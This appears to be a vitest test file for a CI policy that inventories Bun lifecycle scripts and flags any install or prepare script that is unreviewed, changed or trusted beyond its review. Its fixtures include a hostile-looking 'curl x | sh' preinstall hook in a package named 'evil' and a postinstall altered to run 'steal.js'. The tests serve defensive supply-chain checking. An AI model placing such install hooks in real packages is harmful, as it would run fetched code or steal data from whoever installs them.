// T03: Bun lifecycle-script policy. Reads manifests only; never runs a script.
import { createHash } from "node:crypto";
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { afterAll, describe, expect, it } from "vitest";

import {
  inventoryScripts as readInventoryScripts,
  lifecycleProblems,
  prepareDigest,
} from "../../scripts/ci/lifecycle-policy.mjs";
import { parseRestrictedYaml } from "../../scripts/ci/lockfile-graph.mjs";

type Scope = "app" | "release";
const sha256 = (text: string) =>
  createHash("sha256").update(text).digest("hex");
const base = mkdtempSync(join(tmpdir(), "t03-lifecycle-"));
afterAll(() => rmSync(base, { recursive: true, force: true }));

type Spec = {
  entry: string;
  name: string;
  version: string;
  scripts?: Record<string, string>;
  bindingGyp?: boolean;
  dependencies?: Record<string, string>;
};
const expectedGraphs = new Map<string, unknown>();
const inventoryScripts = (dir: string, scope: Scope) =>
  readInventoryScripts(dir, scope, {
    expectedGraph: expectedGraphs.get(dir),
    platform: { os: "darwin", cpu: "arm64" },
  });
/** A synthetic isolated store: node_modules/.bun/<entry>/node_modules/<name>. */
function project(specs: Spec[]) {
  const dir = mkdtempSync(join(base, "p-"));
  for (const spec of specs) {
    const modules = join(
      dir,
      "node_modules",
      ".bun",
      spec.entry,
      "node_modules",
    );
    mkdirSync(join(modules, spec.name), { recursive: true });
    writeFileSync(
      join(modules, spec.name, "package.json"),
      JSON.stringify({
        name: spec.name,
        version: spec.version,
        scripts: spec.scripts,
        dependencies: spec.dependencies,
      }),
    );
    if (spec.bindingGyp)
      writeFileSync(join(modules, spec.name, "binding.gyp"), "{}");
  }
  const nodes = new Map(
    specs.map((spec) => [
      spec.entry,
      {
        id: spec.entry,
        key: `${spec.name}@${spec.version}`,
        name: spec.name,
        version: spec.version,
        integrity: `sha512-${createHash("sha512").update(spec.name).digest("base64")}`,
        os: [],
        cpu: [],
        libc: [],
      },
    ]),
  );
  const roots = specs.map((spec, index) => ({
    alias: `fixture-${index}`,
    kind: "dependencies",
    target: spec.entry,
  }));
  for (const [index, spec] of specs.entries())
    symlinkSync(
      join(".bun", spec.entry, "node_modules", spec.name),
      join(dir, "node_modules", `fixture-${index}`),
    );
  const edges = new Map(
    specs.map((spec) => [
      spec.entry,
      Object.keys(spec.dependencies ?? {}).map((alias) => {
        const target = specs.find((candidate) => candidate.name === alias);
        if (!target) throw new Error(`Missing fixture dependency ${alias}`);
        return { alias, kind: "dependencies", target: target.entry };
      }),
    ]),
  );
  expectedGraphs.set(dir, { nodes, edges, roots, problems: [] });
  return dir;
}
const pathOf = (entry: string, name: string) =>
  `node_modules/.bun/${entry}/node_modules/${name}/package.json`;

const ESBUILD: Spec = {
  entry: "esbuild@0.27.0",
  name: "esbuild",
  version: "0.27.0",
  scripts: { postinstall: "node install.js" },
};
const ACORN: Spec = {
  entry: "acorn@8.18.0",
  name: "acorn",
  version: "8.18.0",
  scripts: { prepare: "cd ..; npm run build:main" },
};

function reviewFor(
  scope: Scope,
  dir: string,
  entries: Record<string, unknown>[],
) {
  const inventory = inventoryScripts(dir, scope);
  return { [scope]: entries, prepare: { [scope]: prepareDigest(inventory) } };
}
const blocked = (spec: Spec, extra: Record<string, unknown> = {}) => ({
  name: spec.name,
  version: spec.version,
  event: Object.keys(spec.scripts ?? {})[0],
  sha256: sha256(Object.values(spec.scripts ?? {})[0]),
  body: Object.values(spec.scripts ?? {})[0],
  paths: [pathOf(spec.entry, spec.name)],
  decision: "blocked",
  ...extra,
});
const check = (
  scope: Scope,
  dir: string,
  review: unknown,
  trustedDependencies: unknown = [],
) =>
  lifecycleProblems({
    inventory: inventoryScripts(dir, scope),
    review,
    scope,
    trustedDependencies,
  });

describe.each(["app", "release"] as const)(
  "lifecycle policy (%s scope)",
  (scope) => {
    const other: Scope = scope === "app" ? "release" : "app";

    it("inventories install-time and prepare scripts separately with path and body hash", () => {
      const dir = project([
        ESBUILD,
        ACORN,
        { entry: "ms@2.1.3", name: "ms", version: "2.1.3" },
      ]);
      const inventory = inventoryScripts(dir, scope);
      expect(inventory.manifests).toBe(3);
      expect(inventory.install).toEqual([
        {
          scope,
          name: "esbuild",
          version: "0.27.0",
          event: "postinstall",
          path: pathOf("esbuild@0.27.0", "esbuild"),
          body: "node install.js",
          sha256: sha256("node install.js"),
        },
      ]);
      expect(
        inventory.prepare.map(
          (row: { name: string; event: string }) => `${row.name}:${row.event}`,
        ),
      ).toEqual(["acorn:prepare"]);
    });

    it("keeps a reviewed blocked script blocked under explicit empty trust", () => {
      const dir = project([ESBUILD, ACORN]);
      const review = reviewFor(scope, dir, [blocked(ESBUILD)]);
      expect(check(scope, dir, review, [])).toEqual([]);
      expect(check(scope, dir, review, ["esbuild"])).toEqual(
        expect.arrayContaining([
          expect.stringContaining("reviewed as blocked but trusted"),
        ]),
      );
    });

    it("rejects omitted trustedDependencies (Bun's default trust list would apply)", () => {
      const dir = project([ESBUILD]);
      const review = reviewFor(scope, dir, [blocked(ESBUILD)]);
      const inventory = inventoryScripts(dir, scope);
      expect(
        lifecycleProblems({
          inventory,
          review,
          scope,
          trustedDependencies: undefined,
        }),
      ).toEqual([
        `${scope}: trustedDependencies must be declared explicitly (omitting it enables Bun's default trust list)`,
      ]);
    });

    it("rejects new, changed and implicit node-gyp install scripts", () => {
      const dir = project([ESBUILD]);
      const review = reviewFor(scope, dir, [blocked(ESBUILD)]);
      const added = project([
        ESBUILD,
        {
          entry: "evil@1.0.0",
          name: "evil",
          version: "1.0.0",
          scripts: { preinstall: "curl x | sh" },
        },
      ]);
      expect(
        check(scope, added, {
          ...review,
          prepare: reviewFor(scope, added, []).prepare,
        }),
      ).toEqual([
        `${scope}: evil@1.0.0 preinstall (${pathOf("evil@1.0.0", "evil")}): unreviewed install-time script`,
      ]);
      const changed = project([
        {
          ...ESBUILD,
          scripts: { postinstall: "node install.js && node steal.js" },
        },
      ]);
      expect(check(scope, changed, review)).toEqual([
        expect.stringContaining("script body changed since review"),
      ]);
      const gyp = project([
        ESBUILD,
        {
          entry: "native@1.0.0",
          name: "native",
          version: "1.0.0",
          bindingGyp: true,
        },
      ]);
      expect(check(scope, gyp, review)).toEqual([
        expect.stringContaining("native@1.0.0 install"),
      ]);
      const bumped = project([
        { ...ESBUILD, entry: "esbuild@0.27.1", version: "0.27.1" },
      ]);
      expect(check(scope, bumped, review)).toEqual(
        expect.arrayContaining([
          expect.stringContaining("esbuild@0.27.1 postinstall"),
          expect.stringContaining("stale review"),
        ]),
      );
    });

    it("limits reviewed trust to its scope, version and installed path", () => {
      const dir = project([ESBUILD]);
      const trusted = blocked(ESBUILD, { decision: "trusted" });
      expect(
        check(scope, dir, reviewFor(scope, dir, [trusted]), ["esbuild"]),
      ).toEqual([]);
      expect(check(scope, dir, reviewFor(scope, dir, [trusted]), [])).toEqual([
        expect.stringContaining(
          "reviewed as trusted but not in trustedDependencies",
        ),
      ]);
      // Same review recorded only for the other scope does not carry over.
      const otherReview = {
        ...reviewFor(other, project([ESBUILD]), [trusted]),
        [scope]: [blocked(ESBUILD)],
        prepare: { [scope]: prepareDigest(inventoryScripts(dir, scope)) },
      };
      expect(check(scope, dir, otherReview, ["esbuild"])).toEqual(
        expect.arrayContaining([
          expect.stringContaining("reviewed as blocked but trusted"),
          `${scope}: trustedDependencies entry esbuild has no reviewed trusted script in this scope`,
        ]),
      );
      // A second installed variant/path or version would run under name-based trust.
      const variants = project([
        ESBUILD,
        { ...ESBUILD, entry: "esbuild@0.27.0+peer" },
        { ...ESBUILD, entry: "esbuild@0.25.0", version: "0.25.0" },
      ]);
      expect(
        check(scope, variants, reviewFor(scope, variants, [trusted]), [
          "esbuild",
        ]),
      ).toEqual(
        expect.arrayContaining([
          expect.stringContaining(
            "trusted review does not cover this installed path",
          ),
          `${scope}: trust for esbuild would also run unreviewed esbuild@0.25.0`,
          expect.stringContaining("esbuild@0.25.0 postinstall"),
        ]),
      );
      expect(
        check(
          scope,
          dir,
          reviewFor(scope, dir, [blocked(ESBUILD, { decision: "maybe" })]),
        ),
      ).toEqual([
        expect.stringContaining("review decision must be blocked or trusted"),
      ]);
    });

    it("requires a reviewed prepare inventory and flags any change to it", () => {
      const dir = project([ESBUILD, ACORN]);
      const review = reviewFor(scope, dir, [blocked(ESBUILD)]);
      expect(check(scope, dir, { [scope]: review[scope] })).toEqual([
        `${scope}: no reviewed prepare-script inventory`,
      ]);
      const changed = project([
        ESBUILD,
        { ...ACORN, scripts: { prepare: "npm run build && node x.js" } },
      ]);
      expect(check(scope, changed, review)).toEqual([
        `${scope}: prepare-script inventory changed (1 reviewed, 1 installed)`,
      ]);
      expect(check(scope, dir, { prepare: review.prepare })).toEqual(
        expect.arrayContaining([
          `${scope}: no reviewed lifecycle baseline`,
          expect.stringContaining("unreviewed install-time script"),
        ]),
      );
    });

    it("requires review for an identical prepare body at a new path", () => {
      const dir = project([ACORN]);
      const review = reviewFor(scope, dir, []);
      const added = project([ACORN, { ...ACORN, entry: "acorn@8.18.0+peer" }]);
      expect(check(scope, added, review)).toEqual([
        expect.stringContaining("prepare-script inventory changed"),
      ]);
    });

    it("binds prepare identities to scope, path, body and observation multiplicity", () => {
      const original = inventoryScripts(project([ACORN]), scope);
      const row = original.prepare[0];
      if (!row) throw new Error("Missing prepare fixture");
      const digest = prepareDigest(original);
      for (const patch of [
        { scope: other },
        { path: pathOf("acorn@8.18.0+peer", "acorn") },
        { body: "different" },
      ])
        expect(
          prepareDigest({ ...original, prepare: [{ ...row, ...patch }] })
            .sha256,
        ).not.toBe(digest.sha256);
      expect(prepareDigest({ ...original, prepare: [row, row] }).count).toBe(2);
      expect(
        lifecycleProblems({
          inventory: { ...original, prepare: [{ ...row, scope: other }] },
          scope,
          trustedDependencies: [],
          review: reviewFor(scope, project([ACORN]), []),
        }),
      ).toEqual(["Invalid lifecycle row scope/path/body/hash"]);
    });

    it("binds blocked reviews to exact paths and body as well as hash", () => {
      const dir = project([ESBUILD]);
      const review = reviewFor(scope, dir, [blocked(ESBUILD)]);
      const added = project([
        ESBUILD,
        { ...ESBUILD, entry: "esbuild@0.27.0+peer" },
      ]);
      expect(check(scope, added, review)).toEqual(
        expect.arrayContaining([expect.stringContaining("installed path")]),
      );
      expect(
        check(
          scope,
          dir,
          reviewFor(scope, dir, [blocked(ESBUILD, { body: "different" })]),
        ),
      ).toEqual(expect.arrayContaining([expect.stringContaining("body")]));
    });

    it("refuses missing store entries and dangling or escaped package links", () => {
      const dir = project([ESBUILD]);
      mkdirSync(join(dir, "node_modules/.bun/missing@1.0.0"));
      expect(() => inventoryScripts(dir, scope)).toThrow(
        /missing|node_modules/,
      );
      const broken = project([ESBUILD]);
      symlinkSync(
        join(base, "absent"),
        join(broken, "node_modules/.bun/esbuild@0.27.0/node_modules/hidden"),
      );
      expect(() => inventoryScripts(broken, scope)).toThrow(/link|ENOENT/);
      const external = project([
        {
          entry: "external@1.0.0",
          name: "external",
          version: "1.0.0",
          scripts: { install: "inert" },
        },
      ]);
      const escaped = project([ESBUILD]);
      symlinkSync(
        join(
          external,
          "node_modules/.bun/external@1.0.0/node_modules/external",
        ),
        join(escaped, "node_modules/.bun/esbuild@0.27.0/node_modules/external"),
      );
      expect(() => inventoryScripts(escaped, scope)).toThrow(
        /outside|escape|contained/,
      );
    });

    it("inventories owned manifests once, validates linked siblings, and refuses missing or empty stores", () => {
      const dir = project([
        ESBUILD,
        {
          entry: "host@1.0.0",
          name: "host",
          version: "1.0.0",
          dependencies: { esbuild: "0.27.0" },
        },
      ]);
      symlinkSync(
        join("..", "..", "esbuild@0.27.0", "node_modules", "esbuild"),
        join(
          dir,
          "node_modules",
          ".bun",
          "host@1.0.0",
          "node_modules",
          "esbuild",
        ),
      );
      expect(inventoryScripts(dir, scope).install).toHaveLength(1);
      expect(() => inventoryScripts(join(base, "absent"), scope)).toThrow(
        /does not exist/,
      );
      const empty = mkdtempSync(join(base, "empty-"));
      mkdirSync(join(empty, "node_modules", ".bun"), { recursive: true });
      expect(() => inventoryScripts(empty, scope)).toThrow(
        /no package manifests/,
      );
    });
  },
);

describe("reviewed baseline derived from the clean darwin-arm64 probes", () => {
  const review = JSON.parse(
    readFileSync("tests/fixtures/bun-lifecycle/reviewed-scripts.json", "utf8"),
  );
  const ignored = parseRestrictedYaml(
    readFileSync("pnpm-workspace.yaml", "utf8"),
  ).ignoredBuiltDependencies;

  it("app blocks exactly pnpm's reviewed ignoredBuiltDependencies; release blocks esbuild", () => {
    expect(
      review.app.map((entry: { name: string }) => entry.name).sort(),
    ).toEqual([...ignored].sort());
    expect(
      review.release.map(
        (entry: { name: string; version: string }) =>
          `${entry.name}@${entry.version}`,
      ),
    ).toEqual(["esbuild@0.27.0"]);
    for (const entry of [...review.app, ...review.release]) {
      expect(entry.decision).toBe("blocked");
      expect(entry.sha256).toBe(sha256(entry.body));
      expect(entry.paths.length).toBeGreaterThan(0);
    }
    expect(review.prepare.app.count).toBeGreaterThan(0);
    expect(review.prepare.release.count).toBeGreaterThan(0);
  });
});

describe("inert marker probe observations (Bun 1.4.3, darwin-arm64 only)", () => {
  // Frozen output of tests/fixtures/bun-lifecycle/marker-probe.mjs: two
  // synthetic packages from a loopback registry; the only script writes a
  // marker. No real dependency script ran. Not Linux evidence.
  const probe = JSON.parse(
    readFileSync(
      "tests/fixtures/bun-lifecycle/marker-probe-darwin-arm64.stdout",
      "utf8",
    ),
  );
  const byId = Object.fromEntries(
    probe.results.map((row: { id: string }) => [row.id, row]),
  );
  const ran = (id: string) =>
    Object.entries(byId[id].markers)
      .filter(([, value]) => value !== null)
      .map(([name]) => name);

  it("completed every case without timeout or signal", () => {
    expect(probe.bun).toBe("1.4.3+c6da4a4d3");
    expect(probe.platform).toBe("darwin-arm64");
    for (const row of probe.results)
      expect(row.install).toMatchObject({
        exit: 0,
        signal: null,
        timedOut: false,
        spawnError: null,
      });
  });

  it("shows the default-trust hazard and that an explicit empty list blocks it", () => {
    expect(ran("omitted")).toEqual(["esbuild"]);
    expect(ran("explicit-empty")).toEqual([]);
    expect(ran("explicit-default-name")).toEqual(["esbuild"]);
    expect(ran("explicit-plain-name")).toEqual(["t03-untrusted-marker"]);
    expect(ran("explicit-default-name-ignore-scripts")).toEqual([]);
  });

  it("records that env=false and --no-env-file do NOT keep .env out of install scripts", () => {
    expect(byId["explicit-default-name"].runtimeDotenv.value).toBe("unset");
    expect(
      byId["explicit-default-name-dotenv-enabled"].runtimeDotenv.value,
    ).toBe("from-dotenv");
    for (const id of [
      "omitted",
      "explicit-default-name",
      "explicit-default-name-no-env-file-global-flag",
      "explicit-default-name-no-env-file-install-flag",
    ])
      expect(byId[id].markers.esbuild).toBe("postinstall:from-dotenv");
  });
});
